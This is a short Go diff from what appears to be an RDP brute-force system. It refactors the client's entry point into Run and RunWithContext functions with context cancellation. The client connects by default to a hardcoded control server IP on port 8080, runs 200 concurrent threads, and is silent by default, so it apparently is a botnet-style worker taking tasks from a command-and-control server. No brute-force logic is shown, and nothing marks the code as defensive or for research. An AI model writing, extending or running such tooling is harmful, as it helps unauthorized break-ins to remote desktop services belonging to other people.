@@ -1,6 +1,7 @@
-package main
+package client
 
 import (
+	"context"
 	"flag"
 	"os"
 	"os/signal"
@@ -14,7 +15,11 @@ import (
 	"rdp-brute-system/shared/protocol"
 )
 
-func main() {
+func Run() {
+	RunWithContext(context.Background())
+}
+
+func RunWithContext(ctx context.Context) {
 	serverAddr := flag.String("server", "84.32.70.197:8080", "Address of the control server")
 	numThreads := flag.Int("threads", 200, "Number of concurrent threads")
 	silent := flag.Bool("silent", true, "Run in silent mode (no console output)")
@@ -63,9 +68,13 @@ func main() {
 		}
 	}()
 
-	<-sigChan
+	select {
+	case <-ctx.Done():
+		logger.ClientLogger.Info("Client context cancelled", nil)
+	case <-sigChan:
+		logger.ClientLogger.Info("Shutdown signal received, stopping client")
+	}
 
-	logger.ClientLogger.Info("Shutdown signal received, stopping client")
 	close(taskQueue)
 	clientWorker.Stop()
 	clientComm.Stop()
